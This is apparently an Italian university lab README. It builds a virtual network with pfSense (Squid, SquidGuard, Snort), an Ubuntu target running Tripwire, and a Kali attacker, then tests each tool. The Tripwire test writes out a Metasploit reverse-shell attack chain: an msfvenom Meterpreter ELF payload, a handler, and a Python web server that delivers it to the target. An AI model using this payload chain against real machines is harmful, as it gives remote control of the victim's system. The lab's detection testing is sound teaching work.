

# Progetto Advanced Cybersecurity
Il seguente repository ha lo scopo di illustrare come implementare un'infrastruttura di macchine virtuali, al fine di testare alcuni software legati alla sicurezza informatica. L' architettura da implementare viene riportata in figura.

![Architettura](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Screened-Network.drawio.png)

Le macchine virtuali sono le seguenti: 
 - **Target**: Ubuntu 22.04.2 LTS (con installato *Tripwire*)
 - **Attacker**: Kali 2023.1 (con installato *python3*)
 - **Firewall**: Pfsense 2.6.0 (con i pacchetti *Squid* e *Snort*)

e sono disponibili già preconfigurate nella cartella condivisa disponibile al seguente url:
https://univpm-my.sharepoint.com/:f:/g/personal/s1108648_studenti_univpm_it/En0-ULIiDpRLgscPrYsplgQB_jYHVS4v2n5tKBSNIyn1Lg?e=J6zcWS

> Nota: la relazione dettagliata è disponibile nel repository.

> Nota: se si usano le macchine preconfigurate passare alle sezione **Test Tripwire**, **Test Squid** e **Test Snort**

## Installazione delle macchine
  ### Pfsense
  ----
 - Dal sito https://www.pfsense.org/download/ scaricare il file ISO.
 - All'interno di  VirtualBox creare una nuova macchina virtuale basata su sistema
   operativo BSD (Free-BSD 64-bit). Non sono necessarie grandi quantità di
   risorse in termini di RAM, disco, processori e memoria video.
 - dal menù **Impostazioni > Archiviazione** montare il file ISO
   scaricato.

 
  ### Ubuntu 
  ----

   - Dal sito https://ubuntu.com/download/desktop scaricare il file ISO.
 - All'interno di  VirtualBox creare una nuova macchina virtuale basata su sistema
   operativo Linux (Ubuntu 64-bit). 
 - Risorse minime: 2GB di RAM, 20GB di disco e  2 processori
 - dal menù **Impostazioni > Archiviazione** montare il file ISO
   scaricato.
  ### Kali
  ----
 - Dal sito https://www.kali.org/get-kali/#kali-installer-images scaricare il file ISO.
 - All'interno di  VirtualBox creare una nuova macchina virtuale basata su sistema
   operativo Linux(Debian 64-bit). 
 - Risorse minime: 2GB di RAM, 20GB di disco e  2 processori
 - dal menù **Impostazioni > Archiviazione** montare il file ISO
   scaricato.
  

## Configurazione

Per quest'attività è stata creata una rete interna a VirtualBox: `172.16.0.0 /24` e una NAT Network: `10.0.2.0 /24` (nella relazione viene approfondita tale configurazione). Sono state configurate le schede di rete virtuali delle macchine dal menù **Impostazioni > Rete**: 

 - **scheda 1 Ubuntu:** *rete interna* (con alias "*intnet*")
 - **scheda 1 Kali**:  *rete con NAT* (NatNetwork)
 - **scheda 1 Pfsense**: *rete con NAT  (NatNetwork)*; **scheda 2 Pfsense**: *rete interna* (con alias "*intnet*").
 
 ![kali net](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Kali%20net.png)
 
 
L'indirizzamento è riportato nella tabella sottostante.

|VM  |IPv4 |Gateway |
|--|--|--|
| `Kali` | `10.0.2.5` |  `10.0.2.1`
| `Ubuntu`| `172.16.0.50`  |  `172.16.0.1`
| `Pfsense`| **WAN**: `10.0.2.4`; **LAN**: `172.16.0.1` |  `10.0.2.1`
 

Di seguito verranno esplicitati tutti i passi di configurazione degli strumenti e la simulazione degli attacchi.

> Nota: gli indirizzi assegnati dinamicamente potrebbero variare ad ogni avvio delle macchine. Per maggiore sicurezza assegnarli manualmente.

## Configurazione
Il primo componente inserito all'interno della rete è Pfsense, una distribuzione firewall open-source basata sul sistema operativo FreeBSD. Una volta avviata e configurata la macchina (opzioni di default), il primo step da affrontare è quello di impostare un nuovo indirizzo IP all'interfaccia di rete LAN (la rete virtuale interna). Per impostarlo basterà attivare il menù `2) Set interface(s) IP address` e successivamente selezionare l'interfaccia LAN (nel caso in questione la numero `2`).  Una volta configurato l'indirizzo IPv4 dell'interfaccia come `172.16.0.1/24` è stato abilitato anche il server DHCP con il seguente range di indirizzi: `172.16.0.50 - 172.16.0.52` (questo operazione eviterà successivamente di impostare manualmente l'indirizzo della macchina `Ubuntu`). 

![pfsensemenu](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/PfSense%20menu.png)

Dalla macchina  `Ubuntu` attraverso un qualsiasi web browser sarà possibile accedere alla GUI per la configurazione di Pfsense (`http://172.16.0.1`) inserendo le credenziali di default: 

 1. **Username**: *admin*
 2. **Password**: *pfsense*

![pfsensedashboard](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/PfSense%20dashboard.png)


 
  ### 1. Regole di NAT su Pfsense
----------
 Una volta finita la configurazione iniziale è stato necessario rendere visibile la macchina `Ubuntu` da `Kali`. Essendo su due segmenti di rete differenti è stato necessario creare un *VirtualIP* da mappare con l'indirizzo di `Ubuntu`.  Nello specifico:
 
 1. dal menù **Firewall > VirtualIP**: aggiungere un nuovo VirtualIP di tipo Alias: `10.0.2.7 /32`
 
![Virtual IP](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Virtual%20IP.png)

 2. dal menù **Firewall > NAT** , scheda **1:1**: aggiungere un nuovo mapping sull'interfaccia WAN tra l'IP `10.0.2.4/32` e quello interno `172.16.0.50`

![Firewall NAT](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Firewall%20NAT%20.png)

Con questa configurazione ogni volta che `Kali` effettuerà ad esempio un operazione di `ping`verso l'IP `10.0.2.7` verrà ridiretta  da Pfsense  verso l'IP interno `172.16.0.50`.

  ### 2. Regole del Firewall su Pfsense
  ----------
  Nonostante questo, la comunicazione tra  `Kali` e `Ubuntu` viene impedita da una regola di default del Firewall che blocca le comunicazioni con indirizzi **RFC 1918** (quindi anche la famiglia `10.0.0.0 – 10.255.255.255`) . Questa può essere disabilitata dal menù **Firewall > Rules** scheda **WAN** premendo sull'ingranaggio e deselezionando la voce alla fine del menù in cui si è ridiretti.
  
  ![block rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/block%20rule.png)

Infine è stata aggiunta una regola per far passare il traffico da `Kali` verso `Ubuntu`.

![pass rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Pass%20Rule.png)

### 3. Squid e SquidGuard su Pfsense
  ----------
 Dal **Package Manager** di `Pfsense` sono stati installati i pacchetti `squid` e `squidGuard`. Entrambi sono stati usati con la funzione di filtrare il traffico *HTTP* della macchina `Ubuntu`.  Dal menù  **Services > Squid Proxy Server** è possibile abilitare il servizio e configurarlo. La configurazione adottata è la seguente:
 

 - **Interface**: LAN
 - **Proxy Port**: 3128
 - **Transparent Mode**: off (non abilitata solo ai fini di visualizzare una pagina di errore in modalità `int error page`; con la modalità transparent non è possibile)

 > Nota 1: le voci non elencate sono state lasciate con le opzioni di default
 
 > Nota 2: Essendo la Transparent Mode disabilitata è necessario andare sulle impostazioni del browser e attivare il server proxy alla porta 3128

Come ultimo passo andare su **Services > SquidGuard Proxy Filter**:

 - scheda **Target Categories**: è stata creata una categoria di siti da bloccare denominata `Siti Bloccati`, è stato inserito il dominio `facebook.com` ed impostata come *Redirect mode* `int error page` (con annesso messaggio di errore) .
 - scheda **General Settings**: oltre ad abilitare il servizio,
   selezionare anche l'opzione *Blacklist* inserendo il seguente URL:
   `https://dsi.ut-capitole.fr/blacklists/download/blacklists_for_pfsense.tar.gz`.
 - scheda **Blacklist**: attraverso il link precedente scaricare i nuovi siti divisi in categorie.
 - scheda **Common ACL**:  nella `Target Rule List`  ai siti appartenenti alla categoria `webmail` e alla categoria `Siti bloccati` impostare `Deny` (l'opzione di *Redirect Mode* è la medesima). Per la categoria *Default Access [all]*, ossia per tutti gli altri siti, è stato concesso il permesso (`Allow`).

Una volta salvate e applicate le regole, i due servizi "gireranno" all'unisono e nella sezione dei **Test** verranno illustrati i risultati.

  
### 4. Snort su Pfsense
  ----------
  Dal menù **Services > Snort**, nella scheda **Global Settings**, sono stati abilitati tutti i repository (nelle rispettive versioni gratuite) dai quali attingere le regole (disabilitando l'opzione per il blocco degli host malevoli). Fatto ciò sono state scaricare le regole dalla scheda **Updates** attraverso il bottone *Update rules*.

![snort rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Snort%20rule.png)

Dalla scheda **Snort Interfaces** è stato aggiunta l'interfaccia su cui Snort effettuerà il rilevamento ossia la WAN di Pfsense.  Successivamente nella scheda **WAN Categories**
sono state selezionate tutte le regole per il rilevamento scaricate in precedenza.

Come ultimo passo è stato avviato Snort sull'interfaccia sempre dalla scheda **Snort Interfaces**.
  
### 5. Tripwire su Ubuntu
  ----------
  Nella macchina `Ubuntu` installare `Tripwire`:
```bash
sudo apt-get update
sudo apt-get install tripwire
```
Al termine dell'istallazione, `Tripwire` chiederà di creare due chiavi:

-   **site key** : utilizzata per proteggere i file di configurazione. 
    
-   **local key** : utilizzata su ogni macchina per eseguire i binari.

>  Nota: assicurati di scegliere passphrase non facilmente deducibili

 ###  Inizializzare il database 
----------

Il primo step è inizializzare il database che `Tripwire` utilizzerà per convalidare il sistema. Questo utilizza il file delle policy e controlla i punti specificati all'interno. Poiché il file di default non è stato ancora personalizzato per il nostro sistema, avremo molti avvisi, falsi positivi ed errori. Per inizializzare il database eseguire:

```bash
sudo tripwire --init
```

Questo creerà il nostro file di database e genererà dei *warnings* che dobbiamo regolare nella configurazione.  Eseguire il comando `check` e posizionare l'output in un file chiamato `test_results` contenuto nella nostra directory di configurazione di `Tripwire` (`etc/tripwire`):

```bash
cd etc/tripwire
sudo sh -c 'tripwire --check | grep Filename > test_results'
```

In esso saranno elencati tutti i file che avevano generato i *warnings* precedenti 

```bash
less /etc/tripwire/test_results
```
```bash
Filename: /etc/rc.boot
Filename: /root/mail
Filename: /root/Mail
Filename: /root/.xsession-errors
. . .
```
 ###  Configurazione file delle policy 
----------

Ottenuto questo elenco, si deve esaminare il file di policy e modificarlo per eliminare questi falsi positivi. Aprire il file *twpol.txt* nell' editor con i privilegi di root:
```bash
sudo nano /etc/tripwire/twpol.txt
```
Eseguire una ricerca per ciascuno dei file restituiti in`test_results`, commentando tutte le righe che corrispondenti. Fatto ciò, creare una nuova regola, dandogli un nome e un livello di gravità:

 - `rulename =  "Detect Change permission"`;
 -   `severity = $(SIG_HI)`.
 
 Nel corpo verrà indicata la directory alla quale verrà applicata la regola `$(SEC_INVARIANT) (recurse = 0)`: non sono tollerati cambi di permessi/proprietà nel primo livello della directory.

![rule](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20rule.png)

Dopodiché, si dovrà ricreare il file di policy crittografato che `Tripwire` effettivamente leggerà:

```bash
sudo twadmin -m P /etc/tripwire/twpol.txt
```
Dopo che questo è stato creato, dobbiamo inizializzare nuovamente il database per implementare la nostra politica:

```bash
sudo tripwire --init
```
```
Please enter your local passphrase:
Parsing policy file: /etc/tripwire/tw.pol
Generating the database...
*** Processing Unix File System ***
Wrote database file: /var/lib/tripwire/tripit.twd
The database was successfully generated.
```

> Nota: se i *warings* persistono rieseguire la procedura con i file indicati  

## Test Tripwire
Per effettuare l'attacco la macchina `Kali` necessita di avere installato python3. 
```bash
sudo  apt update &&  sudo  apt upgrade -y
```
```bash
sudo apt install python3
```
Fatto ciò si può procedere all'attacco avvalendosi del framework *Metasploit*. Aprire 4 terminali:

**1° Terminale**: Ottenere indirizzo ip dell'interfaccia di rete della macchina `Kali`:
 ```bash
ifconfig
```
 
 **2° Terminale**: Creare il pacchetto malevolo (eseguibile):
```bash
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.2.5 LPORT=4444 -f elf -o Desktop/payloads/shell-x86.elf
```

 **3° Terminale**: Ora tramite metaspoilt avvieremo l'*handler* che attenderà l'instaurazione di una *Meterpeter session* verso il `target`
```bash
msfconsle
```
Una volta aperta la console:
```bash
msf6 > use multi/handler
msf6 exploit(multi/handler) > set payload linux/x86/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LHOST 10.0.2.5
msf6 exploit(multi/handler) > set LPORT 4444
msf6 exploit(multi/handler) > exploit

[*] Started reverse handler on 10.0.2.5:4444
[*] Starting the payload handler...
```
Una volta che la macchina `Ubuntu` avrà scaricato ed eseguito il file *.elf*,  verrà aperta una sessione con una reverse shell che permetterà alla macchina `Kali` di compiere l'attacco:
 ```bash
meterpreter > chmod o+x ./Target
```

 **4° Terminale**: Per far ricevere il pacchetto alla macchina `Ubuntu` viene esposto un web server al quale sarà possibile scaricare il file *shell-x86.elf*:
```bash
cd Desktop/payloads
sudo python -m http.server 80
```
---
Per fare in modo che la macchina `Ubuntu` subisca l'attacco è necessario scaricare l'eseguibile esposto dalla macchina `Kali`. Collegandosi all'indirizzo  http://10.0.2.5 tramite un browser, scaricare il file e metterlo nella `Scrivania`, insieme ad una nuova cartella di nome `Target`. Successivamente, concedere i diritti di esecuzione al file `shell-x86.elf`, inizializzare nuovamente il database di `Tripwire` ed eseguire `shell-x86.elf` . I comandi sono i seguenti: 
```bash
sudo chmod +x ./shell-x86.elf ##Concediamo diritti per esecuzione
sudo tripwire --init 
./shell-x86.elf ##Esecuzione
```
Fatto ciò la macchina sarà infetta. Una volta che la macchina `Kali` avrà cambiato i permessi della cartella `./Target` sarà possibile iniziare la procedura di verifica:
```bash
sudo tripwire --check 
```
 la quale restituisce il seguente report di output:

![report](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/Tripwire%20detect.png)

## Test Squid

Per verificare il corretto funzionamento del proxy `Squid`, accedere in *http* ad uno dei siti appartenenti alle categorie bloccate. Nel caso in questione è stato provato l'accesso ai seguenti siti: 
 
 - http://www.gmail.com 
 - http://www.facebook.com

 
In entrambi i casi Squid ha correttamente impedito l'accesso restituendo le seguenti pagine web. 

![squid block](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/squid%20block.png)

![squid block 2](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/squid%20block%202.png)

## Test Snort
Dalla macchina `Kali` è stato lanciato il seguente comando: 

![nmap](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/nmap.png)

il quale è stato correttamente rilevato da Pfsense. 

![snort log](https://github.com/Me77y99/Project-AdvancedCybersecurity/blob/main/img/snort%20log.png)
 
## Autori

- [Mattia Scuriatti](https://github.com/Me77y99)
- [Gatti Giada](https://github.com/S1090231)

